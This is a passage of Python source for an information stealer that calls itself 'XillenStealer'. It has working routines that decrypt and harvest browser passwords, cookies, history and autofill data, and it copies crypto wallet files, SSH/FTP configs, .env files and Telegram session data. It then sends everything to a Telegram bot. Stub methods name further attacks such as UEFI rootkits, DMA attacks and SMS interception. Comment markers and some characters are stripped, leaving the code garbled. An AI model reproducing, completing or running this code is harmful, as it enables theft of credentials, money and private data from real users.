                       'Avant', 'SlimBrowser', 'CoolNovo', 'Comodo Dragon', 'Iron', 'Ungoogled Chromium', 'Iridium'],
            'specialized': ['Discord', 'Steam', 'EpicGames', 'Telegram', 'Signal', 'Slack', 'Skype', 'WhatsApp',
                           'Element', 'Matrix', 'RocketChat', 'Mattermost', 'Teams', 'Zoom', 'Webex', 'Jitsi',
                           'Wire', 'Threema', 'Wickr', 'Session', 'Briar', 'RetroShare', 'Tox', 'Ricochet',
                           'ChatSecure', 'Conversations', 'Silence', 'Signal Desktop', 'Telegram Desktop', 'WhatsApp Desktop']
        }

         List of known cryptocurrency wallets
        self.CRYPTOWALLETS = [
            'Atomic', 'Electrum', 'Exodus', 'Monero', 'Dogecoin', 'Bitcoin', 'Ethereum', 'Litecoin',
            'Coinomi', 'Jaxx', 'MyCelium', 'Bread', 'Copay', 'BitPay', 'Blockchain', 'Coinbase',
            'TrustWallet', 'MetaMask', 'Ledger', 'Trezor', 'KeepKey', 'Wasabi', 'Samourai',
            'Phantom', 'Solflare', 'Backpack', 'Glow', 'Rabby', 'Rainbow', 'Coinbase Wallet',
            'Argent', 'Gnosis Safe', 'Frame', 'Brave Wallet', 'Opera Wallet', 'Edge Wallet',
            'AtomicDEX', 'Komodo', 'Guarda', 'Freewallet', 'BitPay', 'Copay',
            'ElectrumSV', 'Electrum-LTC', 'Electrum-DASH', 'Electrum-BTC', 'Electrum-DOGE',
            'Monero GUI', 'Monerujo', 'Cake Wallet', 'MyMonero', 'Monerov', 'Wownero',
            'Zcash', 'ZecWallet', 'Nighthawk', 'ZecWallet Lite', 'ZelCore',
            'Dash Core', 'Dash Electrum',
            'Litecoin Core', 'Litecoin Electrum',
            'Bitcoin Core', 'Bitcoin Electrum',
            'Ethereum Wallet', 'MyEtherWallet',
            'Binance Chain Wallet', 'Binance Wallet',
            'Huobi Wallet', 'OKEx Wallet', 'KuCoin Wallet', 'Gate.io Wallet',
            'Kraken Wallet', 'Gemini Wallet', 'Crypto.com Wallet',
            'Robinhood Wallet', 'Webull Wallet', 'SoFi Wallet',
            'Cash App', 'PayPal', 'Venmo', 'Zelle', 'Apple Pay', 'Google Pay', 'Samsung Pay'
        ]

 Initialize global configuration and bot
config = AdvancedConfig()
try:
    bot = telebot.TeleBot(config.TGBOTTOKEN)
     Basic check to see if the token is valid (optional, can be noisy)
     bot.getme()
except Exception as e:
    log(f"Failed to initialize Telegram bot with token '{config.TGBOTTOKEN[:5]}...': {e}")
    bot = None  Ensure bot is None if initialization fails

class ExtendedDataCollector:
    def init(self):
        self.collecteddata = {}
        self.stringcrypto = StringEncryption()  Placeholder
        self.totpcollector = TOTPCollector()
        self.biometriccollector = BiometricCollector()
        self.memorydumper = MemoryDumper()
        self.iotscanner = IoTScanner()  Placeholder
        self.dockerexplorer = DockerExplorer()  Placeholder
        self.containerpersistence = ContainerPersistence()  Placeholder
        self.gpumemory = GPUMemory()  Placeholder
        self.ebpfhooks = EBPFHooks()  Placeholder
        self.tpmmodule = TPMModule()  Placeholder
        self.uefirootkit = UEFIRootkit()  Placeholder
        self.networkcardfirmware = NetworkCardFirmware()  Placeholder
        self.virtualfilesystem = VirtualFileSystem()  Placeholder
        self.acpitables = ACPITables()  Placeholder
        self.dmaattacks = DMAAttacks()  Placeholder
        self.wirelessc2 = WirelessC2()  Placeholder
        self.cloudproxy = CloudProxy()  Placeholder
        self.virtualizationmonitor = VirtualizationMonitor()  Placeholder
        self.deviceemulation = DeviceEmulation()  Placeholder
        self.syscallhooks = SyscallHooks()  Placeholder
        self.multifactorauth = MultiFactorAuth()  Placeholder
        self.cloudconfigs = CloudConfigs()  Placeholder
        self.orchestratorconfigs = OrchestratorConfigs()  Placeholder
        self.servicemesh = ServiceMesh()  Placeholder
        self.paymentsystems = PaymentSystems()
        self.mobileemulators = MobileEmulators()  Placeholder
        self.browserfingerprinting = BrowserFingerprinting()
        self.clipboardmonitor = ClipboardMonitor()
        self.filesystemwatcher = FileSystemWatcher()  Placeholder
        self.networktrafficanalyzer = NetworkTrafficAnalyzer()  Placeholder
        self.passwordmanagerintegration = PasswordManagerIntegration()
        self.socialmediatokens = SocialMediaTokens()
        self.linpeasintegration = LinPEASIntegration()  Placeholder
        self.advancedcookieextractor = AdvancedCookieExtractor()
        self.telegramdatacollector = TelegramDataCollector()  Added instance
         self.gamelauncherextractor = GameLauncherExtractor()  Not defined in provided code

    def collectcryptowalletsextended(self):
        """Collects data from various cryptocurrency wallet locations."""
        walletsdata = []
        searchpaths = []
        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            programdata = os.environ.get('PROGRAMDATA', '')
            userprofile = os.environ.get('USERPROFILE', '')
            searchpaths = [
                os.path.join(appdata, 'Atomic'), os.path.join(appdata, 'Electrum'),
                os.path.join(appdata, 'Exodus'), os.path.join(appdata, 'Monero'),
                os.path.join(appdata, 'Ethereum'), os.path.join(localappdata, 'Coinomi'),
                os.path.join(programdata, 'Bitcoin'), os.path.join(userprofile, '.bitcoin'),
                os.path.join(userprofile, '.electrum'), os.path.join(userprofile, '.monero'),
                os.path.join(localappdata, 'Exodus')  Added Exodus in Local AppData
            ]
        else:  Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                os.path.join(home, '.atomic'), os.path.join(home, '.electrum'),
                os.path.join(home, '.exodus'), os.path.join(home, '.bitcoin'),
                os.path.join(home, '.monero'), os.path.join(home, '.ethereum'),
                os.path.join(home, '.config', 'Atomic'), os.path.join(home, '.config', 'Electrum'),
                os.path.join(home, '.config', 'Exodus'), os.path.join(home, '.local', 'share', 'Exodus')  Added common Linux paths
            ]

         Common wallet file names to look for
        walletfilespatterns = ['wallet.dat', 'seed.txt', 'keystore.json', 'wallet.json', 'password.txt', 'key.txt', 'privkey.txt', 'mnemonic.txt']

        for walletbasepath in searchpaths:
            if os.path.exists(walletbasepath) and os.path.isdir(walletbasepath):
                log(f"Scanning for wallets in: {walletbasepath}")
                for root, dirs, files in os.walk(walletbasepath):
                    for file in files:
                        filelower = file.lower()
                         Check if filename matches any pattern or if it's a file without extension (potential key file)
                        if any(pattern in filelower for pattern in walletfilespatterns) or ('.' not in file and len(file) > 10):  Heuristic for potential key files
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'rb') as f:
                                    content = f.read()
                                     Limit content size to avoid large files in report
                                    if len(content) > 1024  1024:  Limit to 1MB
                                        content = content[:10241024] + b'\n... [TRUNCATED]'
                                    walletsdata.append(f"Wallet File: {filepath}\nContent (Base64): {base64.b64encode(content).decode('utf-8')}\n")
                            except Exception as e:
                                log(f"Could not read wallet file {filepath}: {e}")
        return walletsdata

    def collectbrowserdataextended(self):
        """Collects various data points from installed browsers."""
        browserdata = []
        allbrowsers = []
        for category, browsers in config.BROWSERS.items():
            allbrowsers.extend(browsers)

        for browsernamelower in allbrowsers:
            browsernamelower = browsernamelower.lower()  Standardize for easier path matching
            try:
                possiblepaths = []
                if OSTYPE == "Windows":
                    appdata = os.environ.get('APPDATA', '')
                    localappdata = os.environ.get('LOCALAPPDATA', '')

                     Generic Chromium paths
                    possiblepaths.extend([
                        os.path.join(localappdata, browsernamelower, 'User Data', 'Default'),
                        os.path.join(localappdata, browsernamelower, 'User Data', 'Profile 1'),
                        os.path.join(appdata, browsernamelower, 'User Data', 'Default'),
                        os.path.join(appdata, browsernamelower, 'User Data', 'Profile 1'),
                         Specific paths for common browsers if name doesn't match directly
                        os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
                        os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
                        os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                        os.path.join(appdata, 'Opera Software', 'Opera Stable'),
                    ])

                     Generic Firefox paths
                    possiblepaths.extend([
                        os.path.join(appdata, browsernamelower, 'Profiles'),
                        os.path.join(localappdata, browsernamelower, 'Profiles'),
                        os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
                    ])
                else:  Linux/macOS
                    home = os.path.expanduser('~')
                    possiblepaths.extend([
                        os.path.join(home, '.config', browsernamelower, 'Default'),
                        os.path.join(home, '.config', browsernamelower, 'Profile 1'),
                        os.path.join(home, '.mozilla', browsernamelower, 'Profiles'),
                        os.path.join(home, '.cache', browsernamelower, 'Default'),
                         Specific paths
                        os.path.join(home, '.config', 'google-chrome', 'Default'),
                        os.path.join(home, '.config', 'microsoft-edge', 'Default'),
                        os.path.join(home, '.config', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                        os.path.join(home, '.config', 'opera'),
                        os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default'),  macOS
                    ])

                browserpath = None
                for path in possiblepaths:
                    if os.path.exists(path):
                        browserpath = path
                        break

                if not browserpath:
                    continue

                log(f"Found potential path for {browsernamelower}: {browserpath}")

                 --- Data Extraction Logic ---
                 Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.)
                if any(b in browsernamelower for b in ['chrome', 'chromium', 'edge', 'brave', 'vivaldi', 'opera', 'yandex']):
                    databasestocheck = ['Login Data', 'Web Data', 'History', 'Cookies']
                    for dbname in databasestocheck:
                        dbpath = os.path.join(browserpath, dbname)
                        if os.path.exists(dbpath):
                            log(f"Processing {dbname} for {browsernamelower} at {dbpath}")
                            try:
                                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsernamelower}{dbname}{random.randint(1000, 9999)}.db")
                                shutil.copy2(dbpath, tempdbpath)
                                conn = sqlite3.connect(tempdbpath)
                                cursor = conn.cursor()

                                if dbname == 'Login Data':
                                    masterkey = getchromemasterkey()
                                    cursor.execute("SELECT originurl, usernamevalue, passwordvalue FROM logins")
                                    for url, username, passwordencrypted in cursor.fetchall():
                                        if username and passwordencrypted:
                                            decryptedpassword = decryptchromepassword(passwordencrypted, masterkey)
                                            browserdata.append(f"Browser [{browsernamelower.title()} - Login]: {url} | User: {username} | Pass: {decryptedpassword}")
                                elif dbname == 'Web Data':
                                    cursor.execute("SELECT name, value FROM autofill")
                                    for name, value in cursor.fetchall():
                                        browserdata.append(f"Browser [{browsernamelower.title()} - Autofill]: {name}: {value}")
                                elif dbname == 'History':
                                    cursor.execute("SELECT url, title, visitcount, lastvisittime FROM urls ORDER BY lastvisittime DESC LIMIT 50")
                                    for url, title, visits, lastvisitts in cursor.fetchall():
                                        try:
                                            visittime = datetime.fromtimestamp(lastvisitts / 1000000).isoformat() if lastvisitts else 'N/A'
                                        except:
                                            visittime = 'N/A'
                                        browserdata.append(f"Browser [{browsernamelower.title()} - History]]: {url} | Title: {title} | Visits: {visits} | Last Visit: {visittime}")
                                elif dbname == 'Cookies':
                                    cursor.execute("SELECT name, value, hostkey, path, expiresutc FROM cookies LIMIT 50")
                                    for name, value, domain, path, expires in cursor.fetchall():
                                        browserdata.append(f"Browser [{browsernamelower.title()} - Cookie]]: Domain: {domain} | Name: {name} | Value: {value[:50]}... | Path: {path} | Expires: {expires}")
                                conn.close()
                                os.remove(tempdbpath)
                            except Exception as e:
                                log(f"Error processing {dbname} for {browsernamelower}: {e}")

                 Firefox-based browsers
                elif any(b in browsernamelower for b in ['firefox', 'waterfox', 'palemoon', 'seamonkey', 'icecat', 'librewolf', 'floorp']):
                    profiledir = None
                     Find the active profile directory
                    for item in os.listdir(browserpath):
                        if item.endswith(('.default', '.default-release')):
                            profiledir = os.path.join(browserpath, item)
                            break

                    if profiledir and os.path.isdir(profiledir):
                        log(f"Processing Firefox profile: {profiledir}")
                         Extract Passwords from logins.json
                        loginspath = os.path.join(profiledir, 'logins.json')
                        if os.path.exists(loginspath):
                            try:
                                with open(loginspath, 'r', encoding='utf-8') as f:
                                    loginsdata = json.load(f)
                                    for login in loginsdata.get('logins', []):
                                        browserdata.append(f"Browser [{browsernamelower.title()} - Login]: {login.get('hostname', '')} | User: {login.get('username', '')} | Pass: {login.get('password', '[ENCRYPTED]')}")
                            except Exception as e:
                                log(f"Error reading Firefox logins.json: {e}")

                         Extract History from places.sqlite
                        placespath = os.path.join(profiledir, 'places.sqlite')
                        if os.path.exists(placespath):
                            try:
                                conn = sqlite3.connect(placespath)
                                cursor = conn.cursor()
                                cursor.execute("SELECT url, title, visitcount, lastvisitdate FROM mozplaces ORDER BY lastvisitdate DESC LIMIT 50")
                                for url, title, visits, lastvisitts in cursor.fetchall():
                                    try:
                                        visittime = datetime.fromtimestamp(lastvisitts / 1000000).isoformat() if lastvisitts else 'N/A'
                                    except:
                                        visittime = 'N/A'
                                    browserdata.append(f"Browser [{browsernamelower.title()} - History]]: {url} | Title: {title} | Visits: {visits} | Last Visit: {visittime}")
                                conn.close()
                            except Exception as e:
                                log(f"Error processing Firefox places.sqlite: {e}")

                         Extract Cookies from cookies.sqlite
                        cookiespath = os.path.join(profiledir, 'cookies.sqlite')
                        if os.path.exists(cookiespath):
                            try:
                                conn = sqlite3.connect(cookiespath)
                                cursor = conn.cursor()
                                cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM mozcookies LIMIT 50")
                                for name, value, domain, path, expiry, secure, httponly in cursor.fetchall():
                                    browserdata.append(f"Browser [{browsernamelower.title()} - Cookie]]: Domain: {domain} | Name: {name} | Value: {value[:50]}... | Path: {path} | Expires: {expiry} | Secure: {secure} | HttpOnly: {httponly}")
                                conn.close()
                            except Exception as e:
                                log(f"Error processing Firefox cookies.sqlite: {e}")
            except Exception as e:
                log(f"An unexpected error occurred while processing browser {browsernamelower}: {e}")
        return browserdata

    def collectconfigfiles(self):
        """Collects configuration files from common locations."""
        configs = []
        configpatterns = ['.env', 'config.json', 'settings.ini', 'config.ini', 'configuration.json', 'appsettings.json', 'local.settings.json']
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:  Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/etc',
                '/var',
                '/opt',
                 os.path.join(home, '.config'),  Common config directory
                 os.path.join(home, '.local', 'share')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for config files in: {searchpath}")
            for pattern in configpatterns:
                try:
                     Use recursive globbing to find files in subdirectories
                    for filepath in glob.glob(os.path.join(searchpath, '', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                     Limit content size to avoid excessively large reports
                                    if len(content) > 2048:  Limit to 2KB
                                        content = content[:2048] + "\n... [TRUNCATED]"
                                    configs.append(f"Config File: {filepath}\nContent:\n{content}\n---")
                            except Exception as e:
                                log(f"Could not read config file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return configs

    def collectftpsshclients(self):
        """Collects configuration data from FTP and SSH clients."""
        clientsdata = []
        clientsconfigpaths = {}

        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            clientsconfigpaths = {
                'FileZilla': os.path.join(appdata, 'FileZilla'),
                'WinSCP': os.path.join(appdata, 'WinSCP'),
                'PuTTY': os.path.join(appdata, 'PuTTY'),
                'MobaXterm': os.path.join(localappdata, 'MobaXterm', 'msys', 'home', '.ssh'),  MobaXterm SSH config
            }
        else:  Linux/macOS
            home = os.path.expanduser('~')
            clientsconfigpaths = {
                'FileZilla': os.path.join(home, '.filezilla'),
                'OpenSSH': os.path.join(home, '.ssh'),  Standard SSH config directory
                'MobaXterm (Linux)': os.path.join(home, '.mobaxterm', 'msys', 'home', '.ssh'),  If installed via package manager or similar
                'Cyberduck': os.path.join(home, '.config', 'Cyberduck'),  Example for another client
            }

        configfileextensions = ['.xml', '.ini', '.conf', '.config', '.dat', '.cfg', '.json']

        for clientname, clientpath in clientsconfigpaths.items():
            if os.path.exists(clientpath):
                log(f"Scanning for {clientname} configs in: {clientpath}")
                for root, dirs, files in os.walk(clientpath):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in configfileextensions):
                            filepath = os.path.join(root, file)
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                     Limit content size
                                    if len(content) > 1024:  Limit to 1KB
                                        content = content[:1024] + "\n... [TRUNCATED]"
                                    clientsdata.append(f"Client [{clientname}]: {filepath}\nContent:\n{content}\n---")
                            except Exception as e:
                                log(f"Could not read config file {filepath} for {clientname}: {e}")
        return clientsdata

    def collectdatabases(self):
        """Collects information about small database files."""
        databases = []
        dbpatterns = ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb']  Added Access DBs
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:  Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/var/lib',  Common location for system databases
                '/opt',
                os.path.join(home, '.local', 'share'),
                 os.path.join(home, '.config')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for database files in: {searchpath}")
            for pattern in dbpatterns:
                try:
                    for filepath in glob.glob(os.path.join(searchpath, '', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                dbsize = os.path.getsize(filepath)
                                 Consider smaller databases as potentially interesting (e.g., application data)
                                if dbsize < 20  1024  1024:  Up to 20MB
                                    databases.append(f"Database Found: {filepath} ({dbsize / (10241024):.2f} MB)")
                            except Exception as e:
                                log(f"Could not get size or access database file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return databases

    def collectbackups(self):
        """Collects information about potential backup files."""
        backups = []
        backuppatterns = ['.bak', '.backup', '.old', '.save', '.tmp', '.zip', '.tar', '.gz', '.rar']  Added archive types
        searchpaths = []

        if OSTYPE == "Windows":
            searchpaths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                os.environ.get('DOCUMENTS', ''),
                os.environ.get('DESKTOP', ''),  Check Desktop
            ]
        else:  Linux/macOS
            home = os.path.expanduser('~')
            searchpaths = [
                home,
                '/var/backups',
                '/tmp',
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Desktop')
            ]

        for searchpath in searchpaths:
            if not os.path.exists(searchpath):
                continue
            log(f"Scanning for backup files in: {searchpath}")
            for pattern in backuppatterns:
                try:
                    for filepath in glob.glob(os.path.join(searchpath, '', pattern), recursive=True):
                        if os.path.isfile(filepath):
                            try:
                                filesize = os.path.getsize(filepath)
                                 Consider files up to a certain size as potentially interesting backups
                                if filesize < 50  1024  1024:  Up to 50MB
                                    backups.append(f"Backup File Found: {filepath} ({filesize / (10241024):.2f} MB)")
                            except Exception as e:
                                log(f"Could not get size or access backup file {filepath}: {e}")
                except Exception as e:
                    log(f"Error during glob search for {pattern} in {searchpath}: {e}")
        return backups

    def collecttotpdata(self):
        """Collects TOTP seed data from various authenticator apps."""
        return self.totpcollector.collecttotpseeds()

    def collectbiometricdata(self):
        """Collects biometric data if available."""
        return self.biometriccollector.collectbiometricdata()

    def dumpbrowsermemory(self):
        """Dumps memory regions of running browser processes."""
        self.memorydumper.dumpbrowsermemory()
        return ["Browser memory dumping initiated."]

    def scaniotdevices(self):
        """Scans for IoT devices on the network."""
        return self.iotscanner.scaniotdevices()

    def exploredockercontainers(self):
        """Explores running Docker containers."""
        return self.dockerexplorer.exploredockercontainers()

    def infectcontainerruntime(self):
        """Attempts to infect the container runtime for persistence."""
        return self.containerpersistence.infectcontainerruntime()

    def hidedataingpu(self, data):
        """Hides data within GPU memory (conceptual)."""
        return self.gpumemory.hidedataingpu(data)

    def installebpfhooks(self):
        """Installs eBPF hooks for network traffic analysis."""
        return self.ebpfhooks.installtraffichooks()

    def extracttpmkeys(self):
        """Extracts cryptographic keys from the TPM module."""
        return self.tpmmodule.extracttpmkeys()

    def flashuefibios(self):
        """Flashes the UEFI BIOS for rootkit persistence."""
        return self.uefirootkit.flashuefibios()

    def modifynetworkfirmware(self):
        """Modifies network card firmware."""
        return self.networkcardfirmware.modifynetworkfirmware()

    def createhiddenvfs(self):
        """Creates a hidden virtual file system."""
        return self.virtualfilesystem.createhiddenvfs()

    def modifyacpitables(self):
        """Modifies ACPI tables for system manipulation."""
        return self.acpitables.modifyacpitables()

    def performdmaattack(self):
        """Performs a DMA attack (requires specific hardware/permissions)."""
        return self.dmaattacks.performdmaattack()

    def setupwirelessc2(self):
        """Sets up a wireless command and control channel."""
        return self.wirelessc2.setupwirelessc2()

    def proxythroughcloud(self, data):
        """Proxies data through a cloud service."""
        return self.cloudproxy.proxythroughcloud(data)

    def detecthypervisor(self):
        """Detects if the system is running in a virtualized environment."""
        return self.virtualizationmonitor.detecthypervisor()

    def emulateusbdevice(self):
        """Emulates a USB device."""
        return self.deviceemulation.emulateusbdevice()

    def installsyscallhooks(self):
        """Installs system call hooks."""
        return self.syscallhooks.installsyscallhooks()

    def interceptsms(self, phonenumber):
        """Intercepts SMS messages (requires specific permissions/vulnerabilities)."""
        return self.multifactorauth.interceptsms(phonenumber)

    def collectcloudmetadata(self):
        """Collects metadata from cloud environments."""
        return self.cloudconfigs.collectcloudmetadata()

    def collectkubeconfigs(self):
        """Collects Kubernetes configuration files."""
        return self.orchestratorconfigs.collectkubeconfigs()

    def collectservicemeshconfigs(self):
        """Collects service mesh configuration files."""
        return self.servicemesh.collectservicemeshconfigs()

    def scancreditcards(self):
        """Scans for credit card numbers in files."""
        return self.paymentsystems.scancreditcards()

    def detectmobileemulators(self):
        """Detects running mobile emulators."""
        return self.mobileemulators.detectmobileemulators()

    def collectbrowserfingerprint(self):
        """Collects browser fingerprinting data."""
        return self.browserfingerprinting.collectbrowserfingerprint()

    def startclipboardmonitoring(self):
        """Starts monitoring the system clipboard."""
        return self.clipboardmonitor.startmonitoring()

    def getclipboardhistory(self):
        """Retrieves the collected clipboard history."""
        return self.clipboardmonitor.getclipboardhistory()

    def startfilesystemwatching(self):
        """Starts watching for file system changes."""
        return self.filesystemwatcher.startwatching()

    def getfilechanges(self):
        """Retrieves the detected file system changes."""
        return self.filesystemwatcher.getfilechanges()

    def analyzenetworktraffic(self):
        """Analyzes network traffic."""
        return self.networktrafficanalyzer.analyzetraffic()

    def extractpasswordmanagerdata(self):
        """Extracts data from installed password managers."""
        return self.passwordmanagerintegration.extractpasswordmanagerdata()

    def extractsocialmediatokens(self):
        """Extracts authentication tokens from social media applications."""
        return self.socialmediatokens.extractsocialtokens()

    def extractenhancedcookies(self):
        """Extracts cookies using the advanced cookie extractor."""
        return self.advancedcookieextractor.extractallcookies()

    def extractgamelauncherdata(self):
        """Extracts data from game launchers."""
         return self.gamelauncherextractor.extractgamedata()  Method not available in provided code
        log("extractgamelauncherdata is not implemented or available.")
        return []

    def collecttelegramtdata(self):
        """Collects Telegram tdata files and archives them."""
        return self.telegramdatacollector.collecttdata()

def main():
    """Main function to orchestrate data collection and reporting."""
    print("[INFO] Starting XillenStealer...")
    if not config.TGBOTTOKEN or config.TGBOTTOKEN == 'YOURBOTTOKEN':
        log("Telegram Bot Token is not configured. Reports will not be sent.")
    if not config.TGCHATID or config.TGCHATID == 'YOURCHATID':
        log("Telegram Chat ID is not configured. Reports will not be sent.")

    datacollector = ExtendedDataCollector()
    collecteddata = {}

     --- System Information ---
    log("Collecting system information...")
    try:
        systeminfo = {
            'hostname': socket.gethostname(),
            'os': f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
            'processor': platform.processor(),
            'user': getpass.getuser(),
            'cpucount': psutil.cpucount(logical=True),
            'memorygb': round(psutil.virtualmemory().total / (10243), 2),
            'ipaddress': getipaddress(),
            'macaddress': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        }
        collecteddata['systeminfo'] = systeminfo
        log("System information collected.")
    except Exception as e:
        log(f"Error collecting system information: {e}")
        collecteddata['systeminfo'] = {"error": str(e)}

     --- Browser Data ---
    log("Collecting browser data (passwords, cookies, history, autofill)...")
    try:
        collecteddata['passwords'] = collectbrowserpasswords()
        log(f"Collected {len(collecteddata['passwords'])} passwords.")
        collecteddata['cookies'] = collectbrowsercookies()
        log(f"Collected {len(collecteddata['cookies'])} cookies.")
        collecteddata['history'] = collectbrowserhistory()
        log(f"Collected {len(collecteddata['history'])} history entries.")
        collecteddata['autofill'] = collectautofilldata()
        log(f"Collected {len(collecteddata['autofill'])} autofill entries.")
    except Exception as e:
        log(f"Error collecting browser data: {e}")

     --- Processes and Network ---
    log("Collecting running processes...")
    try:
        collecteddata['processes'] = collectprocesses()
        log(f"Collected {len(collecteddata['processes'])} process entries.")
    except Exception as e:
        log(f"Error collecting processes: {e}")

    log("Collecting network connections...")
    try:
        collecteddata['networkconnections'] = collectconnections()
        log(f"Collected {len(collecteddata['networkconnections'])} network connection entries.")
    except Exception as e:
        log(f"Error collecting network connections: {e}")

     --- Specialized Data Collection ---
    log("Collecting Telegram tdata...")
    try:
        collecteddata['telegramtdata'] = datacollector.collecttelegramtdata()
        log(f"Found {len(collecteddata['telegramtdata'])} Telegram tdata archives.")
    except Exception as e:
        log(f"Error collecting Telegram tdata: {e}")

    log("Collecting cryptocurrency wallet data...")
    try:
        collecteddata['cryptowallets'] = datacollector.collectcryptowalletsextended()
        log(f"Collected {len(collecteddata['cryptowallets'])} potential crypto wallet files.")
    except Exception as e:
        log(f"Error collecting crypto wallet data: {e}")

    log("Collecting configuration files...")
    try:
        collecteddata['configfiles'] = datacollector.collectconfigfiles()
        log(f"Collected {len(collecteddata['configfiles'])} configuration files.")
    except Exception as e:
        log(f"Error collecting configuration files: {e}")

    log("Collecting FTP/SSH client data...")
    try:
        collecteddata['ftpsshclients'] = datacollector.collectftpsshclients()
        log(f"Collected {len(collecteddata['ftpsshclients'])} FTP/SSH client configurations.")
    except Exception as e:
        log(f"Error collecting FTP/SSH client data: {e}")

    log("Collecting database file information...")
    try:
        collecteddata['databases'] = datacollector.collectdatabases()
        log(f"Found {len(collecteddata['databases'])} potential database files.")
    except Exception as e:
        log(f"Error collecting database file information: {e}")

    log("Collecting backup file information...")
    try:
        collecteddata['backups'] = datacollector.collectbackups()
        log(f"Found {len(collecteddata['backups'])} potential backup files.")
    except Exception as e:
        log(f"Error collecting backup file information: {e}")

     --- Advanced Features (potentially sensitive/resource intensive) ---
     Uncomment and implement these if needed and understood
     log("Collecting TOTP data...")
     try:
         collecteddata['totpdata'] = datacollector.collecttotpdata()
         log(f"Collected {len(collecteddata['totpdata'])} TOTP data entries.")
     except Exception as e:
         log(f"Error collecting TOTP data: {e}")

     log("Collecting biometric data...")
     try:
         collecteddata['biometricdata'] = datacollector.collectbiometricdata()
         log(f"Collected {len(collecteddata['biometricdata'])} biometric data entries.")
     except Exception as e:
         log(f"Error collecting biometric data: {e}")

     log("Dumping browser memory...")
     try:
         datacollector.dumpbrowsermemory()  This action might not return data directly
         collecteddata['memorydumps'] = ["Browser memory dump initiated."]
     except Exception as e:
         log(f"Error initiating browser memory dump: {e}")

     log("Scanning for IoT devices...")
     try:
         collecteddata['iotdevices'] = datacollector.scaniotdevices()
         log(f"Found {len(collecteddata['iotdevices'])} IoT devices.")
     except Exception as e:
         log(f"Error scanning for IoT devices: {e}")

     --- Reporting ---
    log("Data collection completed. Preparing to send report to Telegram...")
    telegramlanguage = config.TELEGRAMLANGUAGE
    sendtelegramreport(collecteddata, telegramlanguage)
    log("Advanced data collection and reporting process finished.")

if name == "main":
    try:
        main()
    except Exception as e:
        log(f"CRITICAL ERROR: An unhandled exception occurred: {e}")
        log(traceback.formatexc())
         Optionally, save crash details to a file
        try:
            with open("xillencrash.log", "w", encoding="utf-8") as f:
                f.write(f"Timestamp: {datetime.now()}\n")
                f.write(f"Error: {str(e)}\n")
                f.write("Traceback:\n")
                f.write(traceback.formatexc())
        except Exception as loge:
            print(f"[ERROR] Failed to write crash log: {loge}")
